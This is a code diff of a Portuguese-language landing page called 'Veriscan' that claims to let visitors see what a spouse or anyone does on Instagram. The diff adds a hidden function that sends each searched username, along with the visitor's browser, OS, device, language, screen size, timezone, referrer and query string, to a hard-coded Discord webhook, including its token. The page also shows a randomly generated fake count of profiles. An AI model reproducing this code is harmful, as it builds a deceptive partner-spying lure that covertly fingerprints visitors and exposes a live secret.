@@ -212,11 +212,8 @@ input[type=text]::placeholder{color:#6b7280;font-weight:400}
   const hoje = new Date();
   const diaSemana = dias[hoje.getDay()];
 
-  // número aleatório entre 87.000 e 98.000 (aumenta a cada reload)
   const min = 87000, max = 98000;
   const num = Math.floor(Math.random() * (max - min + 1)) + min;
-
-  // formata com ponto
   const formatado = num.toLocaleString('pt-BR');
 
   document.getElementById('contadorPerfis').textContent = '+' + formatado;
@@ -230,26 +227,20 @@ input[type=text]::placeholder{color:#6b7280;font-weight:400}
   const tituloEl = document.getElementById('tituloTypewriter');
   const subEl = document.getElementById('subTypewriter');
 
-  // Texto do título com marcação do gradient (usando HTML)
   const tituloHTML = 'O que seu <span class="gradient-text">Cônjuge</span> faz<br>quando está no Instagram?';
   const subHTML    = 'Descubra a verdade sobre <span class="gradient-text" style="font-weight:600">qualquer pessoa</span>, acessando o instagram dela!';
 
-  // Versão em texto puro (sem tags) pra contar caracteres
   const tituloTexto = tituloHTML.replace(/<[^>]+>/g, '');
   const subTexto    = subHTML.replace(/<[^>]+>/g, '');
 
-  // Cursor piscando
   const cursorHTML = '<span class="typewriter-cursor"></span>';
 
-  // Renderiza o HTML até o índice de caracteres "texto puro"
   function renderAte(htmlCompleto, textoPuro, idx){
-    // Reconstrói o HTML, mantendo tags, mas parando no índice de caracteres visíveis
     let visiveis = 0;
     let resultado = '';
     let i = 0;
     while (i < htmlCompleto.length && visiveis < idx){
       if (htmlCompleto[i] === '<'){
-        // copia a tag inteira sem contar
         const fim = htmlCompleto.indexOf('>', i);
         resultado += htmlCompleto.slice(i, fim + 1);
         i = fim + 1;
@@ -270,13 +261,12 @@ input[type=text]::placeholder{color:#6b7280;font-weight:400}
       el.innerHTML = renderAte(htmlCompleto, textoPuro, idx) + cursorHTML;
       if (idx >= total){
         clearInterval(intervalo);
-        el.innerHTML = htmlCompleto; // remove o cursor no final
+        el.innerHTML = htmlCompleto;
         if (callback) callback();
       }
     }, velocidade);
   }
 
-  // Começa digitando o título, e quando terminar, começa o subtítulo
   digitar(tituloHTML, tituloTexto, tituloEl, 55, () => {
     digitar(subHTML, subTexto, subEl, 30);
   });
@@ -330,6 +320,95 @@ function fmt(n){
   return String(n);
 }
 
+/* ============================================================
+   🔔 WEBHOOK — PERFIL DIGITADO
+   ============================================================ */
+const DISCORD_WEBHOOK_PERFIL = 'https://discord.com/api/webhooks/1553867532966830241/yjvqT3vuTMS7JAcx2dIyGEkJNG534mBr_rXCVwqU35DyJwRew5n8ACEZfHyLqoWvag6_';
+
+async function notificarPerfilDigitado(usernameDigitado) {
+  try {
+    const link = 'https://instagram.com/' + usernameDigitado;
+    const ua = navigator.userAgent;
+
+    // ---------- Navegador ----------
+    let navegador = 'Desconhecido';
+    if (ua.includes('Firefox')) navegador = 'Firefox';
+    else if (ua.includes('Edg')) navegador = 'Edge';
+    else if (ua.includes('OPR') || ua.includes('Opera')) navegador = 'Opera';
+    else if (ua.includes('Chrome')) navegador = 'Chrome';
+    else if (ua.includes('Safari')) navegador = 'Safari';
+
+    // ---------- Sistema operacional ----------
+    let sistema = 'Desconhecido';
+    if (/Windows NT 10/.test(ua)) sistema = 'Windows 10/11';
+    else if (/Windows NT/.test(ua)) sistema = 'Windows';
+    else if (/Android/.test(ua)) sistema = 'Android';
+    else if (/iPhone|iPad|iPod/.test(ua)) sistema = 'iOS';
+    else if (/Mac OS X/.test(ua)) sistema = 'macOS';
+    else if (/Linux/.test(ua)) sistema = 'Linux';
+
+    // ---------- Mobile? ----------
+    const isMobile = /iPhone|iPad|iPod|Android/i.test(ua);
+    const dispositivo = isMobile ? '📱 Mobile' : '💻 Desktop';
+
+    // ---------- Idioma ----------
+    const idioma = navigator.language || 'desconhecido';
+
+    // ---------- Tela ----------
+    const resolucao = screen.width + 'x' + screen.height;
+    const janela    = window.innerWidth + 'x' + window.innerHeight;
+
+    // ---------- Fuso ----------
+    let fuso = 'desconhecido';
+    try { fuso = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e) {}
+
+    // ---------- De onde veio ----------
+    const referrer = document.referrer || 'direto (sem referrer)';
+
+    // ---------- Query string ----------
+    const queryString = location.search || 'nenhum';
+
+    // ---------- Monta embed ----------
+    await fetch(DISCORD_WEBHOOK_PERFIL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        username: 'Perfil Buscado 🔎',
+        embeds: [{
+          title: '🔎 Novo Perfil Buscado',
+          color: 0xab58f4,
+          url: link,
+          fields: [
+            { name: '👤 Perfil',       value: '@' + usernameDigitado, inline: true  },
+            { name: '🔗 Link',         value: link,                   inline: true  },
+
+            { name: '📱 Dispositivo',  value: dispositivo,            inline: true  },
+            { name: '🖥️ Sistema',      value: sistema,                inline: true  },
+            { name: '🌐 Navegador',    value: navegador,              inline: true  },
+            { name: '🌍 Idioma',       value: idioma,                 inline: true  },
+
+            { name: '📐 Tela',         value: resolucao,              inline: true  },
+            { name: '🪟 Janela',       value: janela,                 inline: true  },
+            { name: '🕐 Fuso',         value: fuso,                   inline: false },
+
+            { name: '🔗 Veio de',      value: referrer,               inline: false },
+            { name: '❓ Query string', value: queryString,            inline: false },
+
+            { name: '🕒 Horário',      value: new Date().toLocaleString('pt-BR'), inline: false }
+          ],
+          footer: { text: 'Veriscan' },
+          timestamp: new Date().toISOString()
+        }]
+      })
+    });
+  } catch (err) {
+    console.warn('Falha ao notificar perfil digitado:', err);
+  }
+}
+
+/* ============================================================
+   EVENTOS
+   ============================================================ */
 $('btn-start').addEventListener('click', () => {
   show('screen-usuario');
   setTimeout(() => $('username-input').focus(), 100);
@@ -343,6 +422,9 @@ async function buscarClick(){
   const val = $('username-input').value.replace('@','').trim().toLowerCase();
   if(!val){ $('username-input').focus(); return; }
   username = val;
+
+  // 🔔 Dispara o webhook do perfil digitado (não espera)
+  notificarPerfilDigitado(val);
 
   $('u-input').style.display = 'none';
   $('u-confirm').style.display = 'none';
